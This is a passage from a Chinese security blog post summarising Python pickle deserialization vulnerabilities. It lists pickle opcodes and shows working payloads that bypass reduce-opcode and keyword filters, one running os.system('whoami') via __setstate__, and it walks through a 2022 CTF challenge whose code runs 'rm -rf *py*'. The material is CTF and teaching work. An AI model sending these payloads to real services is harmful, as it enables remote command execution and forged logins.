+<td align="left">实例化一个UNICODE字符串对象</td>
+<td align="left">Vxxx\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">I</td>
+<td align="left">实例化一个int对象</td>
+<td align="left">Ixxx\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">F</td>
+<td align="left">实例化一个float对象</td>
+<td align="left">Fx.x\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">R</td>
+<td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td align="left">R</td>
+<td align="left">函数和参数出栈，函数的返回值入栈</td>
+</tr>
+<tr>
+<td align="left">.</td>
+<td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td align="left">.</td>
+<td align="left">无</td>
+</tr>
+<tr>
+<td align="left">(</td>
+<td align="left">向栈中压入一个MARK标记</td>
+<td align="left">(</td>
+<td align="left">MARK标记入栈</td>
+</tr>
+<tr>
+<td align="left">t</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td align="left">t</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">)</td>
+<td align="left">向栈中直接压入一个空元组</td>
+<td align="left">)</td>
+<td align="left">空元组入栈</td>
+</tr>
+<tr>
+<td align="left">l</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td align="left">l</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">]</td>
+<td align="left">向栈中直接压入一个空列表</td>
+<td align="left">]</td>
+<td align="left">空列表入栈</td>
+</tr>
+<tr>
+<td align="left">d</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td align="left">d</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">}</td>
+<td align="left">向栈中直接压入一个空字典</td>
+<td align="left">}</td>
+<td align="left">空字典入栈</td>
+</tr>
+<tr>
+<td align="left">p</td>
+<td align="left">将栈顶对象储存至memo_n</td>
+<td align="left">pn\n</td>
+<td align="left">无</td>
+</tr>
+<tr>
+<td align="left">g</td>
+<td align="left">将memo_n的对象压栈</td>
+<td align="left">gn\n</td>
+<td align="left">对象被压栈</td>
+</tr>
+<tr>
+<td align="left">0</td>
+<td align="left">丢弃栈顶对象</td>
+<td align="left">0</td>
+<td align="left">栈顶对象被丢弃</td>
+</tr>
+<tr>
+<td align="left">b</td>
+<td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td align="left">b</td>
+<td align="left">栈上第一个元素出栈</td>
+</tr>
+<tr>
+<td align="left">s</td>
+<td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td align="left">s</td>
+<td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+</tr>
+<tr>
+<td align="left">u</td>
+<td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td align="left">u</td>
+<td align="left">MARK标记以及被组合的数据出栈，字典被更新</td>
+</tr>
+<tr>
+<td align="left">a</td>
+<td align="left">将栈的第一个元素append到第二个元素(列表)中</td>
+<td align="left">a</td>
+<td align="left">栈顶元素出栈，第二个元素（列表）被更新</td>
+</tr>
+<tr>
+<td align="left">e</td>
+<td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td align="left">e</td>
+<td align="left">MARK标记以及被组合的数据出栈，列表被更新</td>
+</tr>
+</tbody></table>
+<h2 id="常见WAF绕过"><a href="#常见WAF绕过" class="headerlink" title="常见WAF绕过"></a>常见WAF绕过</h2><h3 id="绕过Unpickler-find-class"><a href="#绕过Unpickler-find-class" class="headerlink" title="绕过Unpickler.find_class()"></a>绕过<code>Unpickler.find_class()</code></h3><p>类沙箱逃逸，尝试从其他类访问属性获取到对应类从而进行命令执行等操作，详见SSTI专题</p>
+<h3 id="绕过指令过滤"><a href="#绕过指令过滤" class="headerlink" title="绕过指令过滤"></a>绕过指令过滤</h3><h4 id="绕过R指令"><a href="#绕过R指令" class="headerlink" title="绕过R指令"></a>绕过R指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.category = category</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> <span class="variable language_">self</span>.name == other.name <span class="keyword">and</span> <span class="variable language_">self</span>.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br></pre></td></tr></table></figure>
+
+<p>可以看到代码中过滤了R指令，字节码里不能存在R.实际上，如果没有<code>R</code>指令，我们同样能够进行函数执行。有下面这样一个例子:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段字节码向栈中压入了一个字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>,并执行<code>b</code>字节码，，由于此时并没有<code>__setstate__</code>，所以这里b字节码相当于执行了<code>__dict__.update</code>，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行<code>b</code>字节码时，由于已经有了<code>__setstate__</code>，所以会将栈中字节码<code>b</code>的前一个元素当作<code>state</code>，执行<code>__setstate__(state)</code>，也就是<code>os.system(command)</code>。</p>
+<h4 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h4><p><strong>[2022强网杯 crash]</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username,password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=username</span><br><span class="line">        <span class="variable language_">self</span>.token=<span class="built_in">hash</span>(password)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原始opcode</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用V指令绕过</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(Vsecr\u0065t           //&#x27;\u0065&#x27;=&#x27;e&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>16进制编码绕过</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于已导入的模块，我们可以通过<code>sys.modules[&#39;xxx&#39;]</code>来获取该模块，然后通过<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/functions.html">内置函数</a>dir()来列出模块中的所有属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;admin&#x27;</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;secret&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>最终opcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://q.qlogo.cn/headimg_dl?dst_uin=2499302531&amp;spec=640&amp;img_type=jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://q.qlogo.cn/headimg_dl?dst_uin=2499302531&amp;spec=640&amp;img_type=jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Ec3o</div><div class="post-copyright__author_desc">山随平野尽，江入大荒流</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/')">Pickle反序列化漏洞小结</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Pickle反序列化漏洞小结&amp;url=http://tech.ec3o.fun/2024/10/22/Web-Basic/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/&amp;pic=https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/blackhole.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://tech.ec3o.fun" target="_blank">Ec3o</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/Web-Security/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>Web Security<span class="categoryesPageCount">4</span></a></div><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Python%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Python安全<span class="tagsPageCount">1</span></a></div></div><div class="post_share"><div class="social-share" data-image="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/java.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/25/Web-Basic/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/php.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP反序列化从浅入深</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://q.qlogo.cn/headimg_dl?dst_uin=2499302531&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">Pickle 反序列化漏洞小结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞的成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pickle%E5%8D%8F%E8%AE%AE%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Pickle协议版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PVM%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">PVM的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81opcode%E4%B8%80%E8%A7%88%E8%A1%A8"><span class="toc-number">1.5.</span> <span class="toc-text">常见opcode一览表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">常见WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87Unpickler-find-class"><span class="toc-number">1.6.1.</span> <span class="toc-text">绕过Unpickler.find_class()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8C%87%E4%BB%A4%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.2.</span> <span class="toc-text">绕过指令过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87R%E6%8C%87%E4%BB%A4"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">绕过R指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">绕过关键字过滤</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/09/%E7%9C%81%E8%B5%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5/" title="省赛碎碎念"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/sea-theme.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="省赛碎碎念"/></a><div class="content"><a class="title" href="/2024/11/09/%E7%9C%81%E8%B5%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5/" title="省赛碎碎念">省赛碎碎念</a><time datetime="2024-11-09T15:13:54.000Z" title="发表于 2024-11-09 23:13:54">2024-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/02/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E5%88%9D/" title="2024浙江省初"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img02.anzhiy.cn/adminuploads/1/2023/04/09/6432a8a257cec.webp!cover" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024浙江省初"/></a><div class="content"><a class="title" href="/2024/11/02/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E5%88%9D/" title="2024浙江省初">2024浙江省初</a><time datetime="2024-11-02T15:54:01.000Z" title="发表于 2024-11-02 23:54:01">2024-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/27/Web-Java_Security/Java%E5%8F%8D%E5%B0%84-RCE/" title="Java反射-RCE"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java反射-RCE"/></a><div class="content"><a class="title" href="/2024/10/27/Web-Java_Security/Java%E5%8F%8D%E5%B0%84-RCE/" title="Java反射-RCE">Java反射-RCE</a><time datetime="2024-10-26T21:19:42.000Z" title="发表于 2024-10-27 05:19:42">2024-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/25/Web-Red_Team/Cobalt%20Strike%E5%85%A5%E9%97%A8/" title="Cobalt Strike 入门"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/c2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike 入门"/></a><div class="content"><a class="title" href="/2024/10/25/Web-Red_Team/Cobalt%20Strike%E5%85%A5%E9%97%A8/" title="Cobalt Strike 入门">Cobalt Strike 入门</a><time datetime="2024-10-25T02:39:01.000Z" title="发表于 2024-10-25 10:39:01">2024-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/25/Web-Basic/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/" title="PHP反序列化从浅入深"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://ec3o.oss-cn-hangzhou.aliyuncs.com/img/php.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化从浅入深"/></a><div class="content"><a class="title" href="/2024/10/25/Web-Basic/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/" title="PHP反序列化从浅入深">PHP反序列化从浅入深</a><time datetime="2024-10-25T00:47:43.000Z" title="发表于 2024-10-25 08:47:43">2024-10-25</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="Ec3o" target="_blank">Ec3o</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">2</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= 